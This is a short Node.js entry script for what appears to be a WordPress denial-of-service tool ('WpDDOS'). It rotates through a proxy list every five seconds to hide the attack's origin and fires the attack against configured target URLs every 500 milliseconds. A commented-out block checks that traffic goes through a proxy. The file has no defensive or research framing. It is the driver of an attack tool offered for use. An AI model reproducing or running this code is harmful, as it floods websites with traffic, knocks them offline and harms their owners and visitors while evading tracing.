const WpDDOS = require('./WpDDOS');
const ProxyChanger = require('./ProxyChanger');
const config = require('./config');
const rp = require('request-promise');



(() => {
    let pc = new ProxyChanger('./proxylist.txt', 5000); //change after 5 sec
    pc.run();

    let wp = new WpDDOS(config.URLS);
    let task = function () {
        wp.runAll();
    };
    setInterval(task, 500);

})();

/*process.env.HTTP_PROXY = 'http://111.7.162.65:8080';

rp('http://ipinfo.info/index.php')
    .then((html) =>{
       console.log(html);
    })
    .catch((err)=>{
       console.log(err);
    });
*/